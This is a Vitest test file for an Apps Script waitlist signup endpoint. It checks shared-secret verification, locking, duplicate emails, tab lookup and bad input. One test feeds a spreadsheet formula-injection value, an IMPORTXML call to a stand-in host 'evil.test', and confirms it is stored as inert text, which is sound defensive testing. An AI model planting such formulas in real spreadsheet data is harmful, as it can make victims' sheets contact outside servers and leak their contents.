// Runs apps-script/Code.gs in a sandbox with fake Apps Script services standing in for Google.
import { readFileSync } from "node:fs";
import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";

const source = readFileSync(new URL("../apps-script/Code.gs", import.meta.url), "utf8");
const SECRET = "s3cret-value";

function loadScript({ rows = [], secret = SECRET, lockFree = true, tabName = "Signups", attached = true } = {}) {
  const state = { rows: rows.map((r) => [...r]), lockReleased: false };
  const sheet = {
    getLastRow: () => state.rows.length,
    getRange(row, col, numRows, numCols) {
      return {
        createTextFinder(text) {
          const finder = {
            matchEntireCell: () => finder,
            matchCase: () => finder,
            findNext() {
              for (let r = row; r < row + numRows; r++) {
                const cell = String(state.rows[r - 1]?.[col - 1] ?? "");
                if (cell.toLowerCase() === text.toLowerCase()) return { row: r };
              }
              return null;
            },
          };
          return finder;
        },
        setValues(values) {
          expect(values[0]).toHaveLength(numCols);
          state.rows[row - 1] = values[0];
        },
      };
    },
  };
  const context = {
    Date, // share the test realm's Date so instanceof checks work
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k === "SHARED_SECRET" ? secret : null) }) },
    LockService: { getScriptLock: () => ({ tryLock: () => lockFree, releaseLock: () => { state.lockReleased = true; } }) },
    SpreadsheetApp: {
      getActiveSpreadsheet: () =>
        attached
          ? {
              getName: () => "INRL Waitlist",
              getSheetByName: (n) => (n === tabName ? sheet : null),
              getSheets: () => [{ getName: () => "Notes" }, Object.assign(sheet, { getName: () => tabName })],
            }
          : null,
    },
    ContentService: {
      MimeType: { JSON: "json" },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
  };
  runInNewContext(source, context);
  const post = (payload) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(payload) } }).text);
  return { context, state, post };
}

const HEADER = ["Timestamp", "First name", "Last name", "Country", "Email", "Source"];
const signup = { secret: SECRET, firstName: "Ada", lastName: "Lovelace", country: "Denmark", email: "ada@example.com", source: "ig" };

describe("Code.gs doPost", () => {
  it("appends one row in header order and releases the lock", () => {
    const { state, post } = loadScript({ rows: [HEADER] });

    expect(post(signup)).toEqual({ ok: true });
    expect(state.rows).toHaveLength(2);
    expect(state.rows[1].slice(1)).toEqual(["Ada", "Lovelace", "Denmark", "ada@example.com", "ig"]);
    expect(state.rows[1][0]).toBeInstanceOf(Date);
    expect(state.lockReleased).toBe(true);
  });

  it("keeps only the first row when the same email signs up again, in any letter case", () => {
    const { state, post } = loadScript({ rows: [HEADER] });
    post(signup);

    expect(post({ ...signup, email: "ADA@example.com", firstName: "Someone" })).toEqual({ ok: true, duplicate: true });
    expect(state.rows).toHaveLength(2);
    expect(state.rows[1][1]).toBe("Ada");
  });

  it("stores formula-looking input as plain text", () => {
    const { state, post } = loadScript({ rows: [HEADER] });
    post({ ...signup, firstName: '=IMPORTXML("http://evil.test","//a")', lastName: "+1", source: "@x" });

    expect(state.rows[1][1]).toBe("'=IMPORTXML(\"http://evil.test\",\"//a\")");
    expect(state.rows[1][2]).toBe("'+1");
    expect(state.rows[1][5]).toBe("'@x");
  });

  it.each([
    ["a wrong secret", { ...signup, secret: "nope" }, {}],
    ["no secret", { ...signup, secret: undefined }, {}],
    ["an unset SHARED_SECRET property", signup, { secret: null }],
  ])("refuses %s and writes nothing", (_label, payload, opts) => {
    const { state, post } = loadScript({ rows: [HEADER], ...opts });

    expect(post(payload)).toEqual({ ok: false, error: "forbidden" });
    expect(state.rows).toHaveLength(1);
  });

  it("reports busy when the lock can't be taken", () => {
    const { state, post } = loadScript({ rows: [HEADER], lockFree: false });

    expect(post(signup)).toEqual({ ok: false, error: "busy" });
    expect(state.rows).toHaveLength(1);
  });

  it.each([["signups"], ["Signups "], [" SIGNUPS"]])("finds the tab even when it's named %j", (tabName) => {
    const { state, post } = loadScript({ rows: [HEADER], tabName });

    expect(post(signup)).toEqual({ ok: true });
    expect(state.rows).toHaveLength(2);
  });

  it("answers no_sheet when no tab is close to Signups", () => {
    const { state, post } = loadScript({ rows: [HEADER], tabName: "Sheet1" });

    expect(post(signup)).toEqual({ ok: false, error: "no_sheet" });
    expect(state.rows).toHaveLength(1);
  });

  it("check action reports the spreadsheet and tabs without writing", () => {
    const { state, post } = loadScript({ rows: [HEADER], tabName: "Sheet1" });

    expect(post({ secret: SECRET, action: "check" })).toEqual({
      ok: true, check: true, spreadsheet: "INRL Waitlist", tabs: ["Notes", "Sheet1"], signupsTab: false,
    });
    expect(state.rows).toHaveLength(1);
    expect(state.lockReleased).toBe(false);
  });

  it("check action still requires the shared secret", () => {
    const { post } = loadScript();
    expect(post({ secret: "nope", action: "check" })).toEqual({ ok: false, error: "forbidden" });
  });

  it("check action reports a script that isn't attached to a spreadsheet", () => {
    const { post } = loadScript({ attached: false });
    expect(post({ secret: SECRET, action: "check" })).toMatchObject({ ok: true, check: true, spreadsheet: null, signupsTab: false });
  });

  it("rejects a body that isn't JSON", () => {
    const { context } = loadScript();
    const res = JSON.parse(context.doPost({ postData: { contents: "not json" } }).text);
    expect(res).toEqual({ ok: false, error: "bad_request" });
  });
});
